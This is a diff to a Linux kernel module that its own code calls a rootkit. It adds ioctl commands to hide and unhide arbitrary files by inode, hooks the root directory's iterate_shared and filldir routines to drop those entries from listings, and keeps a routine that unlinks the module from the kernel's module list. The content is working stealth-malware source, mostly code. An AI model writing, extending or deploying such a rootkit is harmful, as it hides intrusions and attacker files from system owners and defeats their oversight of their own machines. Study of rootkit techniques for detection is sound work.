@@ -33,7 +33,7 @@ static bool hide = false;
 //			struct file *,	
 //			unsigned int ,
 //			unsigned long ); 
-
+static char path_name_to_hide[BUF_LEN];
 
 // Methods
 static ssize_t device_read(struct file * file
@@ -102,11 +102,38 @@ static void hide_module(void){
   //kobject_del(&THIS_MODULE->mkobj.kobj);
 }
 static void unhide_module(void){
-  printk (KERN_INFO "Unhiding module");
-  //list_add(&__this_module.list, module_list_prev);
-  //list_add_tail(&__this_module.list, module_list_next);
+  printk (KERN_INFO "Unhiding module\n");
   __list_add(&__this_module.list, module_list_prev, module_list_next);
 }
+int add_inode_from_path(const char*);
+int remove_inode_from_path(const char*);
+
+
+static void hide_file_ioctl(const char __user *path_name,
+			    size_t length){
+  int i;
+  printk(KERN_INFO "hide_file_ioctl\n");
+  for(i=0; i< length && i< BUF_LEN; i++){
+    get_user(path_name_to_hide[i], path_name+i);
+  }
+  printk(KERN_INFO "path_name_to_hide: %s\n", path_name_to_hide);
+  add_inode_from_path(path_name_to_hide);
+  return;
+}
+
+static void unhide_file_ioctl(const char __user *path_name,
+                            size_t length){
+  int i;
+  printk(KERN_INFO "unhide_file_ioctl\n");
+  for(i=0; i< length && i< BUF_LEN; i++){
+    get_user(path_name_to_hide[i], path_name+i);
+  }
+  printk(KERN_INFO "path_name_to_hide: %s\n", path_name_to_hide);
+  remove_inode_from_path(path_name_to_hide);
+  return;
+}
+
+
 static ssize_t device_ioctl(	/* see include/linux/fs.h */
 			    struct file *file,	/* ditto */
 			    unsigned int ioctl_num,	/* number and param for ioctl */
@@ -115,9 +142,6 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
   int i;
   char *temp;
   char ch;
-  /* 
-   * Switch according to the ioctl called 
-   */
   switch (ioctl_num) {
   case IOCTL_SET_MSG:
     /* 
@@ -133,10 +157,8 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
     get_user(ch, temp);
     for (i = 0; ch && i < BUF_LEN; i++, temp++)
       get_user(ch, temp);
-
     device_write(file, (char *)ioctl_param, i, 0);
     break;
-
   case IOCTL_GET_MSG:
     /* 
      * Give the current message to the calling process - 
@@ -161,12 +183,22 @@ static ssize_t device_ioctl(	/* see include/linux/fs.h */
       hide_module();
     else
       unhide_module();
-    //hide = !hide;
-    return SUCCESS;
     break;
-    
+  case IOCTL_HIDE_FILE:
+    temp = (char *)ioctl_param;
+    get_user(ch, temp);
+    for (i = 0; ch && i < BUF_LEN; i++, temp++)
+      get_user(ch, temp);
+    hide_file_ioctl((char *)ioctl_param, i);
+    break;
+  case IOCTL_UNHIDE_FILE:
+    temp = (char *)ioctl_param;
+    get_user(ch, temp);
+    for (i = 0; ch && i < BUF_LEN; i++, temp++)
+      get_user(ch, temp);
+    unhide_file_ioctl((char *)ioctl_param, i);
+    break;
   }
-    
   return SUCCESS;
 }
 
@@ -177,150 +209,9 @@ struct file_operations fops ={
 			      , .open = device_open
 			      , .release = device_release				     
 };
-/**************************HIDE FILE(OBSOLETE)***************************************/
-
-/*
-  struct dentry* g_parent_dentry;
-  struct path g_root_path;
-  int g_inode_count = 0;
-  unsigned long* g_inode_numbers;
-
-  void** g_old_parent_inode_pointer;
-  void** g_old_parent_fop_pointer;
-
-  filldir_t real_filldir; 
-*/
-
-
-/* static void allocate_memory(void) */
-/* { */
-/*   //g_old_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
-/*   // g_old_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
-/*   // g_old_iop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
-
-/*   g_old_parent_inode_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
-/*   g_old_parent_fop_pointer=(void*)kmalloc(sizeof(void*),GFP_KERNEL); */
-           
-/*   g_inode_numbers=(unsigned long*)kmalloc(sizeof(unsigned long),GFP_KERNEL); */
-
-/* } */
-/* static void reallocate_memmory(void) */
-/* { */
-/*   /\*Realloc memmory for inode number*\/ */
-/*   g_inode_numbers=(unsigned long*)krealloc(g_inode_numbers,sizeof(unsigned long*)*(g_inode_count+1), GFP_KERNEL); */
-	
-/*   // /\*Realloc memmory for old pointers*\/ */
-/*   // g_old_inode_pointer=(void*)krealloc(g_old_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
-/*   // g_old_fop_pointer=(void*)krealloc(g_old_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
-/*   // g_old_iop_pointer=(void*)krealloc(g_old_iop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
-
-/*   g_old_parent_inode_pointer=(void*)krealloc(g_old_parent_inode_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
-/*   g_old_parent_fop_pointer=(void*)krealloc(g_old_parent_fop_pointer, sizeof(void*)*(g_inode_count+1),GFP_KERNEL); */
-/* } */
-
-/*
-  static int new_filldir (void *buf,
-  const char *name,
-  int namelen,
-  loff_t offset,
-  u64 ux64,
-  unsigned ino){
-  unsigned int i = 0;
-  struct dentry* p_dentry;
-  struct qstr current_name;
-  current_name.name = name;
-  current_name.len = namelen;
-  current_name.hash = full_name_hash (NULL,name, namelen);
-
-  p_dentry = d_lookup(g_parent_dentry, &current_name);
-
-  if (p_dentry!=NULL){
-  for(i = 0; i<= g_inode_count - 1; i++){
-  if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
-  return 0;
-  }
-  }
-  }
-  static int new_parent_readdir(struct file* file,
-  void* dirent,
-  filldir_t filldir){
-  g_parent_dentry = file->f_path.dentry;
-  real_filldir = filldir;
-  return  0;
-  }
-
-*/
-
-/*
-  static struct file_operations new_parent_fops =
-  {
-  .owner=THIS_MODULE,
-  .readdir=new_parent_readdir,
-  };
-*/
-/******************************OBSOLETE********************************/
-
-
-
-
-/* unsigned long hook_functions(const char* file_path){ */
-/*   int error = 0; */
-/*   struct path path; */
-
-/*   error = kern_path("/root", LOOKUP_FOLLOW, &g_root_path); */
-/*   if(error){ */
-/*     printk( KERN_ALERT "Can't access root\n"); */
-/*     return -1; */
-/*   } */
-  
-/*   error = kern_path("/root", LOOKUP_FOLLOW, &path); */
-/*   if(error){ */
-/*     printk( KERN_ALERT "Can't access file\n"); */
-/*     return -1; */
-/*   } */
-/*   if (g_inode_count==0) */
-/*     { */
-/*       allocate_memory(); */
-/*     } */
-
-/*   if (g_inode_numbers==NULL) */
-/*     { */
-/*       printk( KERN_ALERT "Not enough memmory in buffer\n"); */
-/*       return -1; */
-/*     } */
-
-/*   /\*Save pointers*\/ */
-/*   g_old_parent_inode_pointer[g_inode_count]=path.dentry->d_parent->d_inode; */
-/*   g_old_parent_fop_pointer[g_inode_count]=(void *)path.dentry->d_parent->d_inode->i_fop; */
-
-/*   /\*Save inode number*\/ */
-/*   g_inode_numbers[g_inode_count]=path.dentry->d_inode->i_ino; */
-/*   g_inode_count=g_inode_count+1; */
-
-/*   reallocate_memmory(); */
-/*   /\*filldir hook*\/ */
-/*   path.dentry->d_parent->d_inode->i_fop=&new_parent_fops; */
-
-/*   // /\* Hook of commands for file*\/ */
-/*   // path.dentry->d_inode->i_op=&new_iop; */
-/*   // path.dentry->d_inode->i_fop=&new_fop; */
-/* } */
-/* /\*unsigned long backup_functions(void){ */
-/*   int i = 0; */
-/*   struct inode* p_inode; */
-/*   struct inode* p_parent_inode; */
-
-/*   for (i = 0; i< g_inode_count; i++){ */
-/*   p_inode = g_old_inode_pointer[(g_inode_count-1)-i]; */
-
-
-/*   p_parent_inode=g_old_parent_inode_pointer[(g_inode_count-1)-i]; */
-/*   p_parent_inode->i_fop=(void *)g_old_parent_fop_pointer[(g_inode_count-1)-i]; */
-/*   } */
-/*   return 0 */
-/*   }*\/ */
 
 /**********************NEW HIDE FILE************************************/
+
 
 // Runtime var
 struct dentry* g_parent_dentry;
@@ -340,13 +231,52 @@ struct inode_to_hide {
 LIST_HEAD(inode_to_hide_list);
 int add_inode(unsigned long ino){
   struct inode_to_hide* inode_entry = (struct inode_to_hide*) kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL);
-  if (!inode_entry)
-    return 0;
+  if (!inode_entry){
+    printk (KERN_ALERT "Not enough kernel memmory\n");
+    return -1;
+  }
   inode_entry->inode_number = ino;
   list_add(&inode_entry->list, &inode_to_hide_list);
   return SUCCESS;
 }
 
+int del_inode(unsigned long ino){
+  struct inode_to_hide *inode_entry, *temp;
+  
+  list_for_each_entry_safe(inode_entry,temp,&inode_to_hide_list, list){
+    if(inode_entry -> inode_number == ino){
+      list_del(&inode_entry->list);
+      kfree(inode_entry);
+      break;
+    }
+  }
+  return SUCCESS;
+  
+}
+
+int add_inode_from_path (const char* file_path){
+  struct path path;
+  int error;
+  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
+  if (error){
+    printk( KERN_ALERT "Can't access file: %s\n", file_path );
+    return -1;
+  }
+  error = add_inode(path.dentry->d_inode->i_ino);
+  return error;
+}
+int remove_inode_from_path (const char* file_path){
+  struct path path;
+  int error;
+  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
+  if (error){
+    printk( KERN_ALERT "Can't access file: %s\n", file_path );
+    return -1;
+  }
+  error = del_inode(path.dentry->d_inode->i_ino);
+  return error;
+
+}
 
 static int new_parent_filldir(struct dir_context* context,
 			      const char* name,
@@ -354,66 +284,29 @@ static int new_parent_filldir(struct dir_context* context,
 			      loff_t offset,
 			      u64 ino,
 			      unsigned int d_type){
-  //  printk(KERN_INFO "New filldir\n");
+  // printk(KERN_INFO "New filldir\n");
   // printk(KERN_INFO "name: %s, namelen: %d, ino: %ld\n", name, namelen, ino);
   // printk(KERN_INFO "inode to hide: %ld", g_inode_num);
   struct inode_to_hide *p;
   list_for_each_entry(p, &inode_to_hide_list, list){
     if(ino == p -> inode_number)
       return 0;
-  }
+  };
   
-  /* // Search in list */
-  /* if(p_dentry != NULL){ */
-  /*   list_for_each_entry(p, &inode_to_hide_list, list){ */
-  /*     if(p -> inode_number == p_dentry->d_inode-> i_ino ) */
-  /* 	return 0; */
-  /*   } */
-
-  /* } */
   // Return original if not in file list
   return original_filldir(context, name, namelen, offset, ino, d_type);
 }
 
-static int new_parent_iterate(struct file *, struct dir_context *);
-static struct file_operations new_parent_fops = {
-						 .iterate = new_parent_iterate,
-};
-
-
 static int new_parent_iterate(struct file *file, struct dir_context *context){
-  //printk(KERN_INFO "New iterate!!!!!!!!!\n");
-  int ret = 0;
-  //printk(KERN_INFO "f_op -> iterate: %p\n", file->f_op->iterate);
-  //printk(KERN_INFO "original_iterate: %p\n", original_iterate);
-  // original_filldir = context->actor;
-  //g_parent_dentry = file->f_path.dentry;
-  //*((filldir_t*)&context->actor) = new_parent_filldir;
-  //ret = g_root_path.dentry->d_inode->i_fop->iterate(file, context);
-  // ret = file->f_path.dentry->d_inode->i_fop->iterate(file, context);
-
-  // Unhook
-  // g_parent_dentry->d_inode->i_fop = original_parent_fops;
-  // Original function
-  // ret = original_parent_fops->iterate(file,context);
-  //ret =  g_parent_dentry->d_inode->i_fop->iterate(file,context);
-  // ret = file->f_op->iterate(file,context);
-  // Rehook
-  //g_parent_dentry->d_inode->i_fop.iterate = &new_parent_fops;
-
-  //ret = file->f_op->iterate(file,context);
-  // ret = original_iterate(file,context);
-  // ret = original_fops->iterate(file,context);
+  
   return original_iterate(file,context);
-  //return 0;
 }
 static int new_parent_iterate_shared(struct file *file, struct dir_context *context){
-  printk(KERN_INFO "New iterate shared!!!!!!!!!\n");
+  // printk(KERN_INFO "New iterate shared!!!!!!!!!\n");
   original_filldir = context->actor;
   *((filldir_t*)&context->actor) = new_parent_filldir;
-  
+ 
   return original_iterate_shared(file,context);
-  //return 0;
 }
 
 // Doesn't work anymore	  
@@ -457,15 +350,13 @@ static int hide_file_hook (const char* file_path){
   int error = 0;
   struct path path;
   
-  printk(KERN_INFO "hooking fop file: %s\n", file_path);
+  //printk(KERN_INFO "hooking fop file: %s\n", file_path);
   error = kern_path(file_path, LOOKUP_FOLLOW, &path);
   if (error){
     printk( KERN_ALERT "Can't access file\n");
     return -1;
   }
   
-  //  g_inode_num = path.dentry->d_inode->i_ino;
-  //  add_inode(path.dentry->d_inode->i_ino);
   g_parent_dentry = path.dentry->d_parent;
   original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
   original_iterate_shared = g_parent_dentry->d_inode->i_fop->iterate_shared;
@@ -493,13 +384,6 @@ static int hide_file_hook (const char* file_path){
   printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n", g_parent_dentry->d_inode->i_fop->iterate);
   printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n", g_parent_dentry->d_inode->i_fop->iterate_shared);
   
-  //path.dentry->d_parent->d_inode->i_fop->iterate = &new_parent_iterate;
-  //ENABLE_W_PROTECTED_MEMORY
-  //DISABLE_W_PROTECTED_MEMORY
-  //printk (KERN_INFO "before:%p" ,file->f_op);
-  //file->f_path.dentry->d_parent->d_inode->i_fop = &new_parent_fops;
-  //printk (KERN_INFO "after:%p" ,file->f_op);
-  //ENABLE_W_PROTECTED_MEMORY
   return SUCCESS;
 }
 
@@ -537,14 +421,14 @@ static int backup_hooks (void){
   return SUCCESS;
 }
 
-static char* test_path_name = "/home/dalo2903/test.c";
+static const char* root_path_name = "/";
 
 // Rootkit init & exit
 static int __init rootkit_init(void)
 {
-  int ret_val;
-  // list_del_init(&__this_module.list);
-  ret_val = hide_file_hook(test_path_name);
+  int ret_val = 0;
+ 
+  ret_val = hide_file_hook(root_path_name);
   if (ret_val < 0){
     printk(KERN_ALERT "Hook failed\n");
     return ret_val;
@@ -555,7 +439,7 @@ static int __init rootkit_init(void)
     printk(KERN_ALERT "%s failed with %d\n",
 	   "Sorry, registering the character device\n ", ret_val);
     return ret_val;
-  
+  }
 
   printk(KERN_INFO "%s The major device number is %d.\n",
 	 "Registeration is a success", MAJOR_NUM);
